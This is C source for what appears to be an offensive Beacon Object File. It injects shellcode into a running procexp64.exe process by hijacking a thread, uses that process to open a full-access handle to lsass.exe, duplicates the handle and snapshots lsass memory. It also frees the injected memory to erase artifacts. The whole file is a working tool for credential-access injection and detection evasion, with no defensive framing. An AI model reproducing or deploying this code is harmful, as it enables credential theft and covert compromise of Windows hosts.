#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <stddef.h>
#include <processsnapshot.h>
#define RETVAL_TAG 0xAABBCCDD




// DECLSPEC_IMPORT <return_type> WINAPI <LIB>$<FUNCNAME>(param1, param2, ...);
// ex. DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD th32ProcessID);

// WINBASEAPI <return_type> __cdecl MSVCRT$<FUNCNAME>(param1, param2, ...);
// ex. WINBASEAPI int __cdecl MSVCRT$getchar(void);
WINBASEAPI int __cdecl MSVCRT$printf(const char * _Format,...);
WINBASEAPI int __cdecl MSVCRT$getchar(void);




DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot( DWORD, DWORD);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$Process32First( HANDLE, LPPROCESSENTRY32);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$Process32Next(HANDLE, LPPROCESSENTRY32);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$Thread32Next(HANDLE, LPTHREADENTRY32);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$PssCaptureSnapshot(HANDLE, PSS_CAPTURE_FLAGS, DWORD, HPSS);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$PssFreeSnapshot(HANDLE, HPSS);



typedef NTSTATUS (NTAPI * RtlRemoteCall_t)(
	HANDLE	Process,
	HANDLE	Thread,
	PVOID	CallSite,
	ULONG	ArgumentCount,
	PULONG	Arguments,
	BOOLEAN	PassContext,
	BOOLEAN	AlreadySuspended
);

typedef NTSTATUS (NTAPI * NtContinue_t)(
	PCONTEXT	ThreadContext,
	BOOLEAN		RaiseAlert
);

typedef int (WINAPI * MessageBox_t)(
	HWND 	hWnd,
	LPCSTR	lpText,
	LPCSTR	lpCaption,
	UINT	uType
);
typedef HANDLE (WINAPI * OpenProcess_t)(
  	DWORD dwDesiredAccess,
 	BOOL  bInheritHandle,
  	DWORD dwProcessId
);

typedef BOOL (WINAPI * CloseHandle_t)(
  	HANDLE hObject
);

typedef void (WINAPI * Sleep_t)(
  	DWORD dwMilliseconds
);


int FindTarget(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
        hProcSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!KERNEL32$Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (KERNEL32$Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hProcSnap);
                
        return pid;
}


int FindThreadID(int pid){

    int tid = 0;
    THREADENTRY32 thEntry;

    thEntry.dwSize = sizeof(thEntry);
    HANDLE Snap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
                
	while (KERNEL32$Thread32Next(Snap, &thEntry)) {
		if (thEntry.th32OwnerProcessID == pid)  {
			tid = thEntry.th32ThreadID;
			break;
		}
	}
	CloseHandle(Snap);
	
	return tid;
}


typedef struct _API_REMOTE_CALL {
	// remote API call return value
	size_t		retval;
	
	// standard function to call at the end of the shellcode
	NtContinue_t ntContinue;
	CONTEXT		context;
	

	// remote function to call - adjust the types!

	// Earlier function:

/*
	MessageBox_t ARK_func;
	HWND		param1;				// hWnd
	char		param2[50];			// szText
	char		param3[50];			// szCaption
	UINT		param4;				// uType
} ApiReeKall;
*/

// New function(OpenProcess):

/*
HANDLE OpenProcess(
  [in] DWORD dwDesiredAccess,
  [in] BOOL  bInheritHandle,
  [in] DWORD dwProcessId
);
*/
	OpenProcess_t ARK_OpenProcess;
	DWORD		param1;			// dwDesiredAccess
	BOOL		param2;			// bInheritHandle
	DWORD		param3;			// dwProcessId


	Sleep_t ARK_Sleep;
	DWORD		Sleep_param;			//dwMilliseconds


	CloseHandle_t ARK_CloseHandle;

} ApiReeKall;



void SHELLCODE(ApiReeKall * ark){
	size_t ret = (size_t) ark->ARK_OpenProcess(ark->param1, ark->param2, ark->param3);
	ark->retval = ret;
	ark->ARK_Sleep(ark->Sleep_param);
	ark->ARK_CloseHandle((HANDLE) ark->retval);
	ark->ntContinue(&ark->context, 0);
}
void SHELLCODE_END(void) {}


size_t MakeReeKall(HANDLE hProcess, HANDLE hThread, ApiReeKall ark) {
	char prolog[] = { 	0x49, 0x8b, 0xcc,   // mov rcx, r12
						0x49, 0x8b, 0xd5,	// mov rdx, r13
						0x4d, 0x8b, 0xc6,	// mov r8, r14
						0x4d, 0x8b, 0xcf	// mov r9, r15
					};
	int prolog_size = sizeof(prolog);
	
	// resolve needed API pointers
	RtlRemoteCall_t pRtlRemoteCall = (RtlRemoteCall_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlRemoteCall");
	NtContinue_t pNtContinue = (NtContinue_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtContinue");
	
	if (pRtlRemoteCall == NULL || pNtContinue == NULL) {
		MSVCRT$printf("[!] Error resolving native API calls!\n");
		return -1;		
	}
	
	// allocate some space in the target for our shellcode
	void * remote_mem = VirtualAllocEx(hProcess, 0, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (remote_mem == NULL) {
		MSVCRT$printf("[!] Error allocating remote memory!\n");
		return -1;
	}
	MSVCRT$printf("[+] Allocated memory = 0x%p\n", remote_mem);
	
	// calculate the size of our shellcode
	size_t sc_size = (size_t) SHELLCODE_END - (size_t) SHELLCODE;
	
	size_t bOut = 0;
#ifdef _WIN64 
	// first, write prolog, if the process is 64-bit
	if (WriteProcessMemory(hProcess, remote_mem, prolog, prolog_size, (SIZE_T *) &bOut) == 0) {
		VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
		MSVCRT$printf("[!] Error writing remote memory (prolog)!\n");
		return -1;
	}
#else
	// otherwise, ignore the prolog
	prolog_size = 0;
#endif
	// write the main payload
	if (WriteProcessMemory(hProcess, (char *) remote_mem + prolog_size, &SHELLCODE, sc_size, (SIZE_T *) &bOut) == 0) {
		VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
		MSVCRT$printf("[!] Error writing remote memory (shellcode)!\n");
		return -1;
	}
	
	// set remaining data in ApiReeKall struct - NtContinue with a thread context we're hijacking
	ark.retval = RETVAL_TAG;
	ark.ntContinue = pNtContinue;
	ark.context.ContextFlags = CONTEXT_FULL;
	SuspendThread(hThread);
	GetThreadContext(hThread, &ark.context);

	// prepare an argument to be passed to our shellcode
	ApiReeKall * ark_arg;
	ark_arg = (ApiReeKall  *) ((size_t) remote_mem + sc_size + prolog_size + 4);		// align to 0x10
	if (WriteProcessMemory(hProcess, ark_arg, &ark, sizeof(ApiReeKall), 0) == 0) {
		VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
		ResumeThread(hThread);
		MSVCRT$printf("[!] Error writing remote memory (ApiReeKall arg)!\n");
		return -1;		
	}
	
	MSVCRT$printf("[+] ark_arg = %#zx\n", ark_arg);
	
	// if all is set, make a remote call
	MSVCRT$printf("[+] All set!\n"); 
	MSVCRT$getchar();
	NTSTATUS status = pRtlRemoteCall(hProcess, hThread, remote_mem, 1, (PULONG) &ark_arg, 1, 1);
	
	MSVCRT$printf("[+] RtlRemoteCall result: %#x\n", status);
	ResumeThread(hThread);

	// get the remote API call return value
	size_t ret = 0;
	while(TRUE) {
		Sleep(1000);
		ReadProcessMemory(hProcess, ark_arg, &ret, sizeof(size_t), (SIZE_T *) &bOut);
		if (ret != RETVAL_TAG) break;
	}


/*
BOOL DuplicateHandle(
  [in]  HANDLE   hSourceProcessHandle,
  [in]  HANDLE   hSourceHandle,
  [in]  HANDLE   hTargetProcessHandle,
  [out] LPHANDLE lpTargetHandle,
  [in]  DWORD    dwDesiredAccess,
  [in]  BOOL     bInheritHandle,
  [in]  DWORD    dwOptions
);
*/
	HANDLE hTarget = NULL;
	BOOL dhr = DuplicateHandle(hProcess, (HANDLE) ret, GetCurrentProcess(), &hTarget, 0, FALSE, DUPLICATE_SAME_ACCESS);
	if(dhr==0){
		MSVCRT$printf("[!] Duplicate Handle function failed!\n");	
		}
	MSVCRT$printf("[+] Duplicated handle = %#x\n", hTarget);
	
	// MSVCRT$getchar();
	

/*
BOOL TerminateProcess(
  [in] HANDLE hProcess,
  [in] UINT   uExitCode
);
*/
/*
	BOOL ter_proc= TerminateProcess(hTarget, 1);
	if(ter_proc == 0){
		printf("[!] TerminateProcess function failed\n");
	}
	printf(("[+] TerminateProcess function executed successfully\n"));
*/

	// TerminateProcess(hTarget, 1);
	
/*
DWORD PssCaptureSnapshot(
  [in]           HANDLE            ProcessHandle,
  [in]           PSS_CAPTURE_FLAGS CaptureFlags,
  [in, optional] DWORD             ThreadContextFlags,
  [out]          HPSS              *SnapshotHandle
);
*/

/*
typedef enum {
  PSS_CAPTURE_NONE = 0x00000000,
  PSS_CAPTURE_VA_CLONE = 0x00000001,
  PSS_CAPTURE_RESERVED_00000002 = 0x00000002,
  PSS_CAPTURE_HANDLES = 0x00000004,
  PSS_CAPTURE_HANDLE_NAME_INFORMATION = 0x00000008,
  PSS_CAPTURE_HANDLE_BASIC_INFORMATION = 0x00000010,
  PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION = 0x00000020,
  PSS_CAPTURE_HANDLE_TRACE = 0x00000040,
  PSS_CAPTURE_THREADS = 0x00000080,
  PSS_CAPTURE_THREAD_CONTEXT = 0x00000100,
  PSS_CAPTURE_THREAD_CONTEXT_EXTENDED = 0x00000200,
  PSS_CAPTURE_RESERVED_00000400 = 0x00000400,
  PSS_CAPTURE_VA_SPACE = 0x00000800,
  PSS_CAPTURE_VA_SPACE_SECTION_INFORMATION = 0x00001000,
  PSS_CAPTURE_IPT_TRACE = 0x00002000,
  PSS_CAPTURE_RESERVED_00004000,
  PSS_CREATE_BREAKAWAY_OPTIONAL = 0x04000000,
  PSS_CREATE_BREAKAWAY = 0x08000000,
  PSS_CREATE_FORCE_BREAKAWAY = 0x10000000,
  PSS_CREATE_USE_VM_ALLOCATIONS = 0x20000000,
  PSS_CREATE_MEASURE_PERFORMANCE = 0x40000000,
  PSS_CREATE_RELEASE_SECTION = 0x80000000
} PSS_CAPTURE_FLAGS;
*/
	
	MSVCRT$printf("Starting to take snapshot\n");
	DWORD flag= PSS_CAPTURE_VA_CLONE;
	HANDLE SnapshotHandle;
	DWORD PssCap_Snap= KERNEL32$PssCaptureSnapshot(hTarget, (PSS_CAPTURE_FLAGS) flag, 0, (HPSS *) &SnapshotHandle);
	MSVCRT$printf("[+] PssCaptureSnapshot function completed, and the return value is: %#x\n", PssCap_Snap);
	

	MSVCRT$getchar();


/*
DWORD PssFreeSnapshot(
  [in] HANDLE ProcessHandle,
  [in] HPSS   SnapshotHandle
);
*/


	MSVCRT$printf("[+]Cleaning up the snapshot\n");
	PssCap_Snap = KERNEL32$PssFreeSnapshot(GetCurrentProcess(), (HPSS) SnapshotHandle);
	MSVCRT$printf("[+] PssFreeSnapshot function completed, and the return value is: %#x\n", PssCap_Snap);
	// MSVCRT$getchar();

	Sleep(10000);

	// dealloc the shellcode memory to remove suspicious artifacts
	if (!VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE))
		MSVCRT$printf("[!] Remote shellcode memory (@%p) could not be released (error code = %x)\n", GetLastError());
	
	return ret;
}


int go(void){
	// get process ID and thread ID of the target
	DWORD pID = FindTarget("procexp64.exe");
	if (pID == 0) {
		MSVCRT$printf("[!] Could not find target process! Is it running?\n");
		return -1;		
	}
	
	DWORD tID = FindThreadID(pID);
	if (tID == 0) {
		MSVCRT$printf("[!] Could not find a thread in target process!\n");
		return -1;		
	}
	
	// open both process and thread in the remote target
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, pID);
	HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, 0, tID);
	if (hProcess == NULL || hThread == NULL) {
		MSVCRT$printf("[!] Error opening remote process and thread!\n");
		return -1;		
	}

	// prepare a ApiReeKall struct with a function to call
	ApiReeKall ark = { 0 };
	ark.ARK_OpenProcess = (OpenProcess_t) GetProcAddress(LoadLibrary("kernel32.dll"), "OpenProcess");
	ark.param1 = PROCESS_ALL_ACCESS;
	ark.param2 = FALSE;
	ark.param3= FindTarget("lsass.exe");

	ark.ARK_Sleep = (Sleep_t) GetProcAddress(LoadLibrary("kernel32.dll"), "Sleep");
	ark.Sleep_param = 10000;

	ark.ARK_CloseHandle = (CloseHandle_t) GetProcAddress(LoadLibrary("kernel32.dll"), "CloseHandle");

	
	size_t ret = MakeReeKall(hProcess, hThread, ark);
	MSVCRT$printf("[+] Remote API call return value = %#zx\n", ret);
	
	//MSVCRT$getchar();
	// cleanup
	CloseHandle(hThread);
	CloseHandle(hProcess);

	return 0;
}